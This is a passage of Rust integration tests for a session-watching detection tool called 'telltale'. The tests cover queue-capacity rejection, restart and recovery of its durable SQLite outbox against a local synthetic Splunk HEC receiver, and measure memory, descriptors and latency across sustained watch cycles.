        let cursor: Value = db.query_row("SELECT generation_id, byte_offset, observed_length, hex(prefix_hash), hex(window_hash), journal_namespace, journal_path_hash, window_start FROM ingest_cursor WHERE id=1", [], |r| Ok(serde_json::json!({
            "generation_id":r.get::<_,String>(0)?, "byte_offset":r.get::<_,u64>(1)?, "observed_length":r.get::<_,u64>(2)?,
            "prefix_hash":r.get::<_,String>(3)?, "window_hash":r.get::<_,String>(4)?,
            "journal_namespace":r.get::<_,String>(5)?, "journal_path_hash":r.get::<_,String>(6)?, "window_start":r.get::<_,u64>(7)?,
        }))).unwrap();
        let sqlite_files = ["", "-wal", "-shm"]
            .into_iter()
            .map(|suffix| {
                (
                    if suffix.is_empty() {
                        "db".to_owned()
                    } else {
                        suffix.trim_start_matches('-').to_owned()
                    },
                    fs::metadata(format!("{}{suffix}", path.display()))
                        .ok()
                        .map(|m| Value::from(m.len()))
                        .unwrap_or(Value::Null),
                )
            })
            .collect::<serde_json::Map<_, _>>();
        serde_json::json!({"deliveries":groups,"retry_rows":retry_rows,"sink_errors":sink_errors,"retained_events":events,"retained_payload_bytes":payload_bytes,"identities":identities,"cursor":cursor,"sqlite_file_bytes":sqlite_files})
    }

    pub(super) fn queue_health(
        home: &Path,
        log: &Path,
        state: &Path,
        outbox: &Path,
        snapshot: &Value,
    ) -> Value {
        let mut command = Command::new(env!("CARGO_BIN_EXE_telltale"));
        command
            .env_clear()
            .env("HOME", home)
            .arg("status")
            .arg("--log-path")
            .arg(log)
            .arg("--state-path")
            .arg(state)
            .arg("--outbox-path")
            .arg(outbox);
        let status = Process::watch(&mut command, home, "queue-health").completed_json();
        let queue = &status["durable_queue_health"];
        assert_eq!(queue["mode"], "durable");
        assert_eq!(
            queue["sinks"]["remote"]["pending_depth"],
            snapshot["deliveries"]["pending"]["rows"]
        );
        assert_eq!(
            queue["sinks"]["remote"]["pending_bytes"],
            snapshot["deliveries"]["pending"]["payload_bytes"]
        );
        assert_eq!(
            queue["sinks"]["remote"]["dead_count"],
            snapshot["deliveries"]["dead"]["rows"]
        );
        queue.clone()
    }
}

#[cfg(target_os = "linux")]
#[test]
#[ignore = "real-process durable pending count saturation/restart/recovery; run explicitly"]
fn watch_synthetic_durable_count_capacity_recovery() {
    watch_synthetic_durable_capacity_case(false, sustained_process::ResponseMode::Prompt);
}

#[cfg(target_os = "linux")]
#[test]
#[ignore = "real-process durable pending byte saturation/restart/recovery; run explicitly"]
fn watch_synthetic_durable_byte_capacity_recovery() {
    watch_synthetic_durable_capacity_case(true, sustained_process::ResponseMode::Prompt);
}

#[cfg(target_os = "linux")]
#[test]
#[ignore = "slow-success count capacity restart/recovery; run explicitly"]
fn watch_synthetic_durable_slow_count_capacity_recovery() {
    watch_synthetic_durable_capacity_case(false, sustained_process::ResponseMode::Delayed);
}

#[cfg(target_os = "linux")]
#[test]
#[ignore = "configured timeout byte capacity restart/recovery; run explicitly"]
fn watch_synthetic_durable_timeout_byte_capacity_recovery() {
    watch_synthetic_durable_capacity_case(true, sustained_process::ResponseMode::Timeout);
}

#[cfg(target_os = "linux")]
fn watch_synthetic_durable_capacity_case(byte_limit: bool, mode: sustained_process::ResponseMode) {
    let _guard = watch_process_guard();
    sustained_process::report_directory();
    // The byte case leaves ample count capacity but cannot admit a second
    // fixed-size detection payload. Terminal history is not part of either cap.
    let (count_cap, byte_cap, dimension) = if byte_limit {
        (16, 5000, "pending_bytes")
    } else {
        (1, 1048576, "pending_events")
    };
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path().join("stores");
    let sessions = root.join("codex/sessions");
    fs::create_dir_all(&sessions).unwrap();
    let first = sessions.join("first.jsonl");
    let rejected = sessions.join("rejected.jsonl");
    for path in [&first, &rejected] {
        fs::write(path, b"").unwrap();
    }
    let phases = [
        sustained_process::positive(0),
        sustained_process::positive(1),
    ];
    let log = temp.path().join("events.jsonl");
    let state = temp.path().join("state.json");
    let outbox = temp.path().join("private/outbox.sqlite");
    let config = temp.path().join("config");
    fs::create_dir_all(config.join("outputs.d")).unwrap();
    let receiver = sustained_process::Receiver::new(mode);
    let timeout_ms = mode.timeout_ms();
    let outputs = format!(
        "version: 1\ndelivery:\n  policy: durable\n  outbox_path: {}\n  max_pending_events: {count_cap}\n  max_pending_bytes: {byte_cap}\nsinks:\n  - name: canonical\n    type: jsonl\n    path: {}\n  - name: remote\n    type: splunk_hec\n    endpoint: http://{}\n    token: synthetic-capacity-token\n    timeout_ms: {timeout_ms}\n    retry: {{ max_attempts: 100, base_delay_ms: 30000 }}\n",
        outbox.display(),
        log.display(),
        receiver.address
    );
    let outputs_path = config.join("outputs.d/outputs.yaml");
    fs::write(&outputs_path, &outputs).unwrap();
    let binary_hash = format!(
        "{:x}",
        sha2::Sha256::digest(fs::read(env!("CARGO_BIN_EXE_telltale")).unwrap())
    );
    let spawn = |name: &str| {
        assert_eq!(fs::read_to_string(&outputs_path).unwrap(), outputs);
        assert_eq!(
            format!(
                "{:x}",
                sha2::Sha256::digest(fs::read(env!("CARGO_BIN_EXE_telltale")).unwrap())
            ),
            binary_hash
        );
        let mut command = sustained_process::command(temp.path(), &root, &state);
        command.arg("--config-dir").arg(&config);
        let mut process = sustained_process::Process::watch(&mut command, temp.path(), name);
        process.ready(&sessions);
        process
    };
    let mut measurements = workload::Measurements::new(match mode {
        sustained_process::ResponseMode::Delayed => "durable-real-process-slow-count-capacity",
        sustained_process::ResponseMode::Timeout => "durable-real-process-timeout-byte-capacity",
        sustained_process::ResponseMode::Prompt if byte_limit => {
            "durable-real-process-byte-capacity"
        }
        sustained_process::ResponseMode::Prompt => "durable-real-process-count-capacity",
    });
    let mut process = spawn("fill");
    process.before_write();
    let started = Instant::now();
    fs::write(&first, &phases[0]).unwrap();
    let summary = process.health(started + Duration::from_secs(20));
    assert_eq!(summary["emitted_count"], 1);
    assert_eq!(
        summary["source_processing"]["parse_success_source_count"],
        1
    );
    let admitted_latency = started.elapsed();
    process.quiet();
    let admitted = sustained_process::outbox(&outbox);
    assert_eq!(admitted["retry_rows"][0]["attempt_count"], 1);
    let expected_class = if matches!(mode, sustained_process::ResponseMode::Timeout) {
        "timeout"
    } else {
        "http_status"
    };
    assert_eq!(
        admitted["retry_rows"][0]["last_error_class"],
        expected_class
    );
    let due = admitted["retry_rows"][0]["next_attempt_at"]
        .as_u64()
        .unwrap();
    assert_eq!(
        due - admitted["retry_rows"][0]["updated_at"].as_u64().unwrap(),
        30000
    );
    assert_eq!(
        admitted["sink_errors"][0]["last_error_class"],
        expected_class
    );
    assert_eq!(
        admitted["sink_errors"][0]["last_error_at"],
        admitted["retry_rows"][0]["updated_at"]
    );
    let unix_ms = || {
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis() as u64
    };
    assert!(
        due > unix_ms(),
        "retry must remain future during restart/rejection"
    );
    assert_eq!(
        receiver.requests.lock().unwrap().len(),
        1,
        "one durable attempt"
    );
    // Retryable 503 work remains pending, without manufacturing a terminal
    // delivery diagnostic. Only actual source-generated work fills the queue.
    assert_eq!(admitted["deliveries"]["pending"]["rows"], 1);
    assert_eq!(admitted["retained_events"], 1);
    assert!(
        admitted["deliveries"]["pending"]["payload_bytes"]
            .as_u64()
            .unwrap()
            > 0
    );
    assert!(
        admitted["deliveries"]["pending"]["payload_bytes"]
            .as_u64()
            .unwrap()
            <= byte_cap
    );
    if byte_limit {
        assert!(
            admitted["deliveries"]["pending"]["payload_bytes"]
                .as_u64()
                .unwrap()
                * 2
                > byte_cap
        );
    }
    let full_queue_health =
        sustained_process::queue_health(temp.path(), &log, &state, &outbox, &admitted);
    measurements.observe(process.id());
    measurements.sample(
        "admitted-and-workload-capacity-full",
        admitted_latency,
        &state,
        &log,
    );
    measurements.source_counts(&summary);
    measurements.settled(process.id(), serde_json::json!({"outbox":admitted,"journal":sustained_process::journal(&log),"collections":sustained_process::collections(&state)}));
    let state_before = fs::read(&state).unwrap();
    let journal_before = fs::read(&log).unwrap();
    let shutdown_started = Instant::now();
    process.terminate();
    let shutdown_ms = shutdown_started.elapsed().as_secs_f64() * 1000.0;
    let restart_started = Instant::now();
    let mut process = spawn("restart-full");
    let restarted = sustained_process::outbox(&outbox);
    assert_eq!(restarted["identities"], admitted["identities"]);
    assert_eq!(restarted["cursor"], admitted["cursor"]);
    assert!(unix_ms() < due, "restart missed future retry window");
    assert_eq!(restarted["retry_rows"], admitted["retry_rows"]);
    assert_eq!(restarted["sink_errors"], admitted["sink_errors"]);
    assert_eq!(
        receiver.requests.lock().unwrap().len(),
        1,
        "restart sent before due"
    );
    assert_eq!(fs::read(&state).unwrap(), state_before);
    assert_eq!(fs::read(&log).unwrap(), journal_before);
    measurements.observe(process.id());
    measurements.sample("restarted-full", restart_started.elapsed(), &state, &log);
    measurements.settled(
        process.id(),
        serde_json::json!({"outbox":restarted,"journal":sustained_process::journal(&log)}),
    );
    // Fixed 2000ms start-to-start cadence includes synchronous transport.
    thread::sleep(
        (started + Duration::from_millis(2000)).saturating_duration_since(Instant::now()),
    );
    process.before_write();
    let reject_started = Instant::now();
    let reject_lateness =
        reject_started.saturating_duration_since(started + Duration::from_millis(2000));
    fs::write(&rejected, &phases[1]).unwrap();
    let rejected_pid = process.id();
    let diagnostic = process.rejected(dimension);
    let rejected_snapshot = sustained_process::outbox(&outbox);
    assert_eq!(
        fs::read(&log).unwrap(),
        journal_before,
        "overflow appended canonical journal"
    );
    let before: Value = serde_json::from_slice(&state_before).unwrap();
    let after: Value = serde_json::from_slice(&fs::read(&state).unwrap()).unwrap();
    for field in [
        "seen_source_fingerprints",
        "seen_detection_fingerprints",
        "baseline_snapshots",
        "baseline_source_contributions",
        "sqlite_ingestion_cursors",
        "install_inventory",
    ] {
        assert_eq!(before[field], after[field], "overflow advanced {field}");
    }
    let observations = |state: &Value| {
        let mut observations = state["source_observations"].clone();
        for value in observations.as_object_mut().unwrap().values_mut() {
            value.as_object_mut().unwrap().remove("last_seen_unix_ms");
        }
        observations
    };
    assert_eq!(
        observations(&before),
        observations(&after),
        "overflow promoted a source observation"
    );
    assert_eq!(rejected_snapshot["identities"], admitted["identities"]);
    assert_eq!(
        rejected_snapshot["cursor"], admitted["cursor"],
        "overflow advanced ingest cursor"
    );
    assert_eq!(rejected_snapshot["deliveries"]["pending"]["rows"], 1);
    assert!(unix_ms() < due, "rejection missed future retry window");
    assert_eq!(rejected_snapshot["retry_rows"], admitted["retry_rows"]);
    assert_eq!(rejected_snapshot["sink_errors"], admitted["sink_errors"]);
    assert_eq!(
        receiver.requests.lock().unwrap().len(),
        1,
        "rejection sent before due"
    );
    // The process has exited and been reaped; no live memory sample is
    // available for this stage, even if an earlier observation used this PID.
    measurements.reset_process(rejected_pid);
    measurements.sample(
        "rejected-before-append",
        reject_started.elapsed(),
        &state,
        &log,
    );
    measurements.samples.last_mut().unwrap()["settled"] =
        serde_json::json!({"outbox":rejected_snapshot,"journal":sustained_process::journal(&log)});
    measurements.samples.last_mut().unwrap()["memory_sampling_scope"] =
        Value::from("exited process; memory unavailable, not sampled after rejection");
    receiver
        .available
        .store(true, std::sync::atomic::Ordering::SeqCst);
    let recovery_started = Instant::now();
    let mut process = spawn("recover");
    let deadline = recovery_started + Duration::from_secs(30);
    let recovered = loop {
        let snapshot = sustained_process::outbox(&outbox);
        assert_eq!(snapshot["identities"], admitted["identities"]);
        assert_eq!(snapshot["deliveries"]["dead"]["rows"], 0);
        if unix_ms() + 25 < due {
            assert_eq!(snapshot["retry_rows"], admitted["retry_rows"]);
            assert_eq!(snapshot["sink_errors"], admitted["sink_errors"]);
            assert_eq!(
                receiver.requests.lock().unwrap().len(),
                1,
                "recovery sent before due"
            );
        }
        if snapshot["deliveries"]["acked"]["rows"] == 1 {
            break snapshot;
        }
        assert!(
            Instant::now() < deadline,
            "committed pending recovery deadline"
        );
        thread::sleep(Duration::from_millis(20));
    };
    let recovery_latency = recovery_started.elapsed();
    measurements.observe(process.id());
    measurements.sample(
        "committed-pending-recovered",
        recovery_latency,
        &state,
        &log,
    );
    measurements.settled(
        process.id(),
        serde_json::json!({"outbox":recovered,"journal":sustained_process::journal(&log)}),
    );
    // Rewriting the rejected bytes is a genuine parser retry after capacity is
    // freed, not a manual enqueue or DB mutation.
    process.before_write();
    let retry_started = Instant::now();
    fs::write(&rejected, &phases[1]).unwrap();
    let retry_summary = process.health(retry_started + Duration::from_secs(20));
    let retry_latency = retry_started.elapsed();
    assert_eq!(retry_summary["emitted_count"], 1);
    assert_eq!(
        retry_summary["source_processing"]["parse_success_source_count"],
        1
    );
    process.quiet();
    let final_snapshot = sustained_process::outbox(&outbox);
    let recovered_queue_health =
        sustained_process::queue_health(temp.path(), &log, &state, &outbox, &final_snapshot);
    assert_eq!(final_snapshot["deliveries"]["pending"]["rows"], 0);
    assert_eq!(final_snapshot["deliveries"]["acked"]["rows"], 2);
    assert_eq!(final_snapshot["deliveries"]["dead"]["rows"], 0);
    assert_eq!(
        final_snapshot["retained_events"], 2,
        "no duplicate promotion or silent loss"
    );
    for (id, payload) in admitted["identities"].as_object().unwrap() {
        assert_eq!(&final_snapshot["identities"][id], payload);
    }
    measurements.observe(process.id());
    measurements.sample(
        "rejected-source-admitted-after-recovery",
        retry_latency,
        &state,
        &log,
    );
    measurements.source_counts(&retry_summary);
    measurements.settled(process.id(), serde_json::json!({"outbox":final_snapshot,"journal":sustained_process::journal(&log),"collections":sustained_process::collections(&state)}));
    process.before_write();
    let repeat_started = Instant::now();
    fs::write(&rejected, &phases[1]).unwrap();
    let repeat = process.health(repeat_started + Duration::from_secs(20));
    let repeat_latency = repeat_started.elapsed();
    assert_eq!(repeat["emitted_count"], 0);
    assert!(
        repeat["detection_flow"]["state_deduplicated_detection_count"]
            .as_u64()
            .unwrap()
            > 0
    );
    process.quiet();
    assert_eq!(
        sustained_process::outbox(&outbox)["identities"],
        final_snapshot["identities"]
    );
    measurements.observe(process.id());
    measurements.sample(
        "recovered-source-deduplicated",
        repeat_latency,
        &state,
        &log,
    );
    measurements.source_counts(&repeat);
    measurements.settled(process.id(), serde_json::json!({"outbox":sustained_process::outbox(&outbox),"journal":sustained_process::journal(&log)}));
    process.terminate();
    let requests = receiver.finish();
    let canonical = fs::read_to_string(&log)
        .unwrap()
        .lines()
        .map(|line| {
            let event: Value = serde_json::from_str(line).unwrap();
            (event["event_id"].as_str().unwrap().to_owned(), event)
        })
        .collect::<std::collections::BTreeMap<_, _>>();
    for request in &requests {
        let id = request["event_id"].as_str().unwrap();
        assert_eq!(
            request["event"], final_snapshot["identities"][id]["event"],
            "receiver/outbox JSON content parity"
        );
        assert_eq!(
            request["event"], canonical[id],
            "receiver/journal JSON content parity"
        );
    }
    for request in requests
        .iter()
        .skip(1)
        .filter(|r| r["event_id"] == requests[0]["event_id"])
    {
        assert!(
            request["received_unix_ms"].as_u64().unwrap() >= due,
            "received retry before stored due time"
        );
    }
    let accepted_ids = requests
        .iter()
        .filter(|r| r["status"] == 200)
        .map(|r| r["event_id"].as_str().unwrap())
        .collect::<std::collections::BTreeSet<_>>();
    for id in final_snapshot["identities"].as_object().unwrap().keys() {
        assert!(accepted_ids.contains(id.as_str()));
    }
    let recipe = format!(
        "codex first.jsonl/rejected.jsonl initially empty; compiled defaults; phase A fill; TERM; same-binary restart before due; phase B rejected before append; restore same receiver; same-binary restart; ack pending before separate 30s deadline; phase B retry then dedup; pending_events={count_cap}; pending_bytes={byte_cap}; timeout={timeout_ms}ms; retry_base=30000ms; debounce=100ms; min_scan_interval=0ms; quiet=250ms"
    );
    measurements.finish(&[&phases[0],&phases[1],recipe.as_bytes()], "ordered two synthetic fixed source phases plus deterministic capacity recipe; actual binary admission only", serde_json::json!({
        "recipe":recipe,"recipe_sha256":format!("{:x}",sha2::Sha256::digest(recipe.as_bytes())),
        "max_pending_events":count_cap,"max_pending_bytes":byte_cap,"saturated_dimension":dimension,
        "full_definition":"cannot admit one more fixed-size synthetic detection; byte cap need not be exactly filled",
        "fill_to_reject_start_cadence_ms":2000,"reject_schedule_lateness_ms":reject_lateness.as_secs_f64()*1000.0,
        "fill_to_reject_schedule_cadence_misses":u64::from(reject_lateness >= Duration::from_millis(2000)),
        "source_to_health_cadence_misses":([admitted_latency,retry_latency,repeat_latency].iter().filter(|d| **d >= Duration::from_millis(2000)).count()),
        "processing_only_latency":"UNAVAILABLE; source-to-health includes synchronous transport",
        "shutdown_ms":shutdown_ms,"configured_transport_timeout_ms":timeout_ms,
        "outage_response_delay_ms":mode.delay(false).as_millis(),"restored_response_delay_ms":mode.delay(true).as_millis(),
        "stored_retry_due_unix_ms":due,"stored_retry_schedule_delay_ms":due-admitted["retry_rows"][0]["updated_at"].as_u64().unwrap(),
        "debounce_ms":100,"min_scan_interval_ms":0,"quiet_ms":250,"recovery_deadline_ms":30000,
        "retry_max_attempts":100,"retry_base_delay_ms":30000,"receiver_retry_after_seconds":2,
        "receiver":"synthetic loopback HEC; received requests logged before response/stall; server response writes are not client completion",
        "rules":"compiled defaults","client":"codex","allow_fixtures":true,"install_inventory_disabled":true,
        "fixed_source_paths":["codex/sessions/first.jsonl","codex/sessions/rejected.jsonl"],
        "fixed_session_id":"uc001-positive","iterations":"unbounded watch, explicit TERM; overflow exits nonzero",
        "binary_hash_unchanged_across_restart":binary_hash,"config_unchanged_across_restart":true,
        "latency_roles":"process write-to-health, restart-to-ready, write-to-rejection, restore/restart-to-persisted-ack; receiver request-to-response is separate",
    }), serde_json::json!({
        "receiver_requests":requests,"recovery_ms":recovery_latency.as_secs_f64()*1000.0,
        "capacity_rejection_diagnostic":diagnostic,
        "cursor_scope":"canonical JSONL ingest cursor and JSONL source dedup/baseline progress; no SQLite source parser cursor exercised",
        "semantics":"at least once; request counts are controlled observation, not an exactly-once guarantee",
        "retention":"pending caps do not cap acked/dead history, retained payload bytes or SQLite physical bytes",
        "exposed_queue_health":{"full":full_queue_health,"recovered":recovered_queue_health},
    }));
}

#[cfg(target_os = "linux")]
#[test]
#[ignore = "60-cycle settled Linux process characterization; run explicitly"]
fn watch_synthetic_sustained_settled_cycles() {
    watch_synthetic_settled_case("watch-sustained-60-settled", 60, 1000, 1);
}

#[cfg(target_os = "linux")]
#[test]
#[ignore = "two-hour fixed-identity settled process characterization; run explicitly"]
fn watch_synthetic_multi_hour_settled_cycles() {
    watch_synthetic_settled_case("watch-multi-hour-settled", 7201, 1000, 1);
}

#[cfg(target_os = "linux")]
#[test]
#[ignore = "fixed one-source load tier; run explicitly"]
fn watch_synthetic_fixed_load_1_settled_cycles() {
    watch_synthetic_settled_case("watch-fixed-load-1-settled", 120, 2000, 1);
}

#[cfg(target_os = "linux")]
#[test]
#[ignore = "fixed sixteen-source load tier; run explicitly"]
fn watch_synthetic_fixed_load_16_settled_cycles() {
    watch_synthetic_settled_case("watch-fixed-load-16-settled", 120, 2000, 16);
}

#[cfg(target_os = "linux")]
#[test]
#[ignore = "fixed sixty-four-source load tier; run explicitly"]
fn watch_synthetic_fixed_load_64_settled_cycles() {
    watch_synthetic_settled_case("watch-fixed-load-64-settled", 120, 2000, 64);
}

#[cfg(target_os = "linux")]
fn watch_synthetic_settled_case(
    name: &'static str,
    default_cycles: u64,
    cadence_ms: u64,
    source_count: usize,
) {
    let _guard = watch_process_guard();
    sustained_process::report_directory();
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path().join("stores");
    let sessions = root.join("codex/sessions");
    fs::create_dir_all(&sessions).unwrap();
    let base_phases = [
        sustained_process::positive(0),
        sustained_process::positive(1),
    ];
    assert_eq!(base_phases[0].len(), 708);
    let legacy_identity = default_cycles == 60 || default_cycles == 7201;
    let session_ids = (0..source_count)
        .map(|index| {
            if legacy_identity {
                "uc001-positive".to_owned()
            } else {
                format!("fixed-load-{index:03}")
            }
        })
        .collect::<Vec<_>>();
    let sources = (0..source_count)
        .map(|index| {
            sessions.join(if legacy_identity {
                "fixed.jsonl".to_owned()
            } else {
                format!("fixed-{index:03}.jsonl")
            })
        })
        .collect::<Vec<_>>();
    let phases = (0..source_count)
        .map(|index| {
            base_phases.each_ref().map(|phase| {
                String::from_utf8(phase.clone())
                    .unwrap()
                    .replace("uc001-positive", &session_ids[index])
                    .into_bytes()
            })
        })
        .collect::<Vec<_>>();
    for (source, phase) in sources.iter().zip(&phases) {
        assert_eq!(phase[0].len(), 708);
        assert_eq!(phase[0].len(), phase[1].len());
        fs::write(source, &phase[1]).unwrap();
    }
    let cycles = std::env::var("TELLTALE_WORKLOAD_CYCLES")
        .ok()
        .map(|v| v.parse::<u64>().expect("positive smoke cycle count"))
        .unwrap_or(default_cycles);
    assert!(
        cycles > 0 && cycles <= default_cycles,
        "TELLTALE_WORKLOAD_CYCLES only shortens the fixed default for developer smoke"
    );
    let state = temp.path().join("state.json");
    let log = temp.path().join("events.jsonl");
    let mut command = sustained_process::command(temp.path(), &root, &state);
    command
        .args([
            "--no-local-config",
            "--log-rotate-max-size",
            "1",
            "--log-rotate-keep",
            "2",
        ])
        .arg("--log-path")
        .arg(&log);
    let mut process = sustained_process::Process::watch(&mut command, temp.path(), "sustained");
    process.ready(&sessions);
    let mut measurements = workload::Measurements::new(name);
    let epoch = Instant::now();
    let mut postwarm_rss = Vec::new();
    let mut overruns = Vec::new();
    let mut postwarm_collections = None;
    let mut postwarm_journal = None;
    let mut fd_baseline = None;
    let mut parsed_records = None;
    let mut cadence_met = true;
    let mut state_bytes_by_phase = [None, None];
    let mut latenesses = Vec::new();
    let mut write_times = Vec::new();
    let mut cadence_misses = 0;
    let window_cycles = if default_cycles == 7201 { 300 } else { 12 };
    for cycle in 0..cycles {
        let scheduled = epoch + Duration::from_millis(cycle * cadence_ms);
        thread::sleep(scheduled.saturating_duration_since(Instant::now()));
        if default_cycles == 7201 && cycles == default_cycles && cycle == cycles - 1 {
            let first_write = epoch + Duration::from_secs_f64(write_times[0]);
            thread::sleep(
                (first_write + Duration::from_secs(7200)).saturating_duration_since(Instant::now()),
            );
        }
        process.before_write();
        let started = Instant::now();
        let lateness = started.saturating_duration_since(scheduled);
        latenesses.push(lateness.as_secs_f64() * 1000.0);
        write_times.push(started.duration_since(epoch).as_secs_f64());
        if lateness >= Duration::from_millis(10) {
            overruns.push(serde_json::json!({"cycle":cycle, "schedule_lateness_ms":lateness.as_secs_f64()*1000.0}));
        }
        let mut per_write_lateness_ms = Vec::with_capacity(source_count);
        for (source, phase) in sources.iter().zip(&phases) {
            per_write_lateness_ms.push(
                Instant::now()
                    .saturating_duration_since(scheduled)
                    .as_secs_f64()
                    * 1000.0,
            );
            fs::write(source, &phase[cycle as usize % 2]).unwrap();
        }
        let batch_write_ms = started.elapsed().as_secs_f64() * 1000.0;
        assert!(
            batch_write_ms < 100.0,
            "tier writes exceeded debounce batch: {batch_write_ms}ms"
        );
        let summary = process.health(started + Duration::from_secs(20));
        let latency = started.elapsed();
        assert_eq!(
            summary["source_processing"]["parse_success_source_count"],
            source_count as u64
        );
        assert_eq!(
            summary["source_processing"]["parsed_record_count"],
            source_count as u64 * 3
        );
        assert!(summary["detection_count"].as_u64().unwrap() > 0);
        assert_eq!(
            parsed_records
                .get_or_insert(summary["source_processing"]["parsed_record_count"].clone()),
            &summary["source_processing"]["parsed_record_count"]
        );
        if cycle >= 2 {
            assert_eq!(summary["emitted_count"], 0);
            assert!(
                summary["detection_flow"]["state_deduplicated_detection_count"]
                    .as_u64()
                    .unwrap()
                    > 0
            );
        } else {
            assert!(summary["emitted_count"].as_u64().unwrap() > 0);
        }
        process.quiet();
        measurements.observe(process.id());
        measurements.sample("settled-cycle", latency, &state, &log);
        measurements.source_counts(&summary);
        let collections = sustained_process::collections(&state);
        let journal = sustained_process::journal(&log);
        assert!(journal["file_count"].as_u64().unwrap() <= 3);
        if cycle >= 12 {
            let bytes = fs::metadata(&state).unwrap().len();
            assert_eq!(
                *state_bytes_by_phase[cycle as usize % 2].get_or_insert(bytes),
                bytes,
                "fixed phase state bytes grew"
            );
            assert_eq!(
                postwarm_collections.get_or_insert(collections.clone()),
                &collections
            );
            assert_eq!(
                postwarm_journal.get_or_insert(journal.clone()),
                &journal,
                "deduplicated steady cycles grew retained journal"
            );
        }
        measurements.settled(process.id(), serde_json::json!({
            "cycle":cycle, "phase":cycle%2, "schedule_lateness_ms":lateness.as_secs_f64()*1000.0,
            "elapsed_since_epoch_ms":epoch.elapsed().as_secs_f64()*1000.0,
            "batch_write_ms":batch_write_ms,"source_bytes":708*source_count,"source_records":3*source_count,
            "per_source_write_schedule_lateness_ms":per_write_lateness_ms,
            "quiet_ms":250, "collections":collections, "journal":journal,
            "queue":"NOT CONFIGURED", "terminal_history":"NOT CONFIGURED",
        }));
        // Procfs is a prerequisite of this Linux-only case, not an RSS cap.
        let sample = measurements.samples.last();
        if let Some(sample) = sample {
            let fd = sample["settled_fd_count"]
                .as_u64()
                .expect("settled FD measurement");
            if cycle >= 12 {
                let baseline = *fd_baseline.get_or_insert(fd);
                assert!(
                    fd <= baseline,
                    "fixed watch workload accumulated descriptors"
                );
                postwarm_rss.push(
                    sample["settled_current_rss_kib"]
                        .as_u64()
                        .expect("settled RSS measurement"),
                );
            }
        }
        let met = latency < Duration::from_millis(cadence_ms);
        cadence_met &= met;
        cadence_misses += u64::from(!met);
        if cycle % 60 == 0 {
            let directory = std::env::var_os("TELLTALE_WORKLOAD_REPORT_DIR").unwrap();
            fs::write(Path::new(&directory).join(format!("{name}.partial.json")), serde_json::to_vec(&serde_json::json!({
                "status":"INCOMPLETE", "completed_cycles":cycle+1,"requested_cycles":cycles,"default_cycles":default_cycles,
                "elapsed_seconds":epoch.elapsed().as_secs_f64(),"samples":measurements.samples,
                "note":"periodic checkpoint; not full-duration acceptance evidence",
            })).unwrap()).unwrap();
        }
    }
    // Final sample above is alive and quiet; termination is not the sample.
    let actual_elapsed = epoch.elapsed().as_secs_f64();
    let shutdown_started = Instant::now();
    process.terminate();
    let shutdown_ms = shutdown_started.elapsed().as_secs_f64() * 1000.0;
    let windows = postwarm_rss
        .chunks(window_cycles)
        .enumerate()
        .map(|(index, window)| {
            let start_cycle = 12 + index*window_cycles;
            let end_cycle = start_cycle+window.len()-1;
            let samples = &measurements.samples[start_cycle..=end_cycle];
            let mut latencies = samples.iter().map(|s| s["latency_ms"].as_f64().unwrap()).collect::<Vec<_>>();
            latencies.sort_by(f64::total_cmp);
            serde_json::json!({
                "count":window.len(), "min_kib":window.iter().min(), "max_kib":window.iter().max(),
                "mean_kib":window.iter().sum::<u64>() as f64 / window.len() as f64,
                "start_cycle":start_cycle,"end_cycle":end_cycle,
                "start_elapsed_seconds":write_times[start_cycle],"end_elapsed_seconds":write_times[end_cycle],
                "rss_first_kib":window.first(),"rss_last_kib":window.last(),
                "latency_ms":{"p50":latencies[(latencies.len()*50).div_ceil(100)-1],"p95":latencies[(latencies.len()*95).div_ceil(100)-1],"max":latencies.last()},
                "max_schedule_lateness_ms":samples.iter().map(|s| s["settled"]["schedule_lateness_ms"].as_f64().unwrap()).max_by(f64::total_cmp),
            })
        })
        .collect::<Vec<_>>();
    let monotonic = if postwarm_rss.len() > 1 {
        Some(
            postwarm_rss.windows(2).all(|w| w[1] >= w[0])
                && postwarm_rss.last() > postwarm_rss.first(),
        )
    } else {
        None
    };
    let x = &write_times[write_times.len().min(12)..];
    let slope = if x.len() > 1 {
        let mx = x.iter().sum::<f64>() / x.len() as f64;
        let my = postwarm_rss.iter().sum::<u64>() as f64 / x.len() as f64;
        let denominator = x.iter().map(|v| (v - mx).powi(2)).sum::<f64>();
        Some(
            x.iter()
                .zip(&postwarm_rss)
                .map(|(a, b)| (a - mx) * (*b as f64 - my))
                .sum::<f64>()
                / denominator
                * 3600.0,
        )
    } else {
        None
    };
    latenesses.sort_by(f64::total_cmp);
    let late_percentile =
        |p: usize| latenesses[(latenesses.len() * p).div_ceil(100).saturating_sub(1)];
    let recipe = format!(
        "codex {source_count} fixed paths/session IDs precreated phase B; compiled defaults; {cycles} alternating 708-byte/3-record A/B cycles; warmup 12; epoch+cycle*{cadence_ms}ms; batch within debounce; health then >=250ms quiet; rotation_size=1; rotation_keep=2; TERM after final live sample"
    );
    let mut fixtures = phases
        .iter()
        .flat_map(|p| p.iter().map(Vec::as_slice))
        .collect::<Vec<_>>();
    fixtures.push(recipe.as_bytes());
    measurements.finish(&fixtures, "ordered fixed-size synthetic phases for every fixed identity plus deterministic sustained recipe", serde_json::json!({
        "recipe":recipe,"recipe_sha256":format!("{:x}",sha2::Sha256::digest(recipe.as_bytes())),
        "cycles":cycles,"default_cycles":default_cycles,"developer_cycle_override":std::env::var("TELLTALE_WORKLOAD_CYCLES").ok(),
        "full_default_duration_measured":cycles == default_cycles,"actual_elapsed_seconds":actual_elapsed,
        "first_to_last_write_seconds":write_times.last().unwrap()-write_times.first().unwrap(),"shutdown_ms":shutdown_ms,
        "warmup_cycles":12, "cadence_ms":cadence_ms, "cadence":"scheduled epoch, never rescheduled after slow cycles",
        "cadence_misses":cadence_misses,"schedule_lateness_ms":{"p50":late_percentile(50),"p95":late_percentile(95),"max":latenesses.last()},
        "scheduled_cadence_misses":latenesses.iter().filter(|ms| **ms >= cadence_ms as f64).count(),
        "schedule_overrun_threshold_ms":10, "schedule_overruns":overruns,
        "write_to_health_within_cadence":cadence_met,
        "debounce_ms":100, "min_scan_interval_ms":0, "quiet_ms":250,
        "rules":"compiled defaults", "client":"codex", "allow_fixtures":true, "no_local_config":true,
        "install_inventory_disabled":true, "log_rotate_max_size":1, "log_rotate_keep":2,
        "source_count":source_count, "bytes_per_source":708,"source_bytes":708*source_count, "source_records":3*source_count,
        "fixed_source_paths":sources.iter().map(|p| p.strip_prefix(&root).unwrap().to_string_lossy()).collect::<Vec<_>>(),
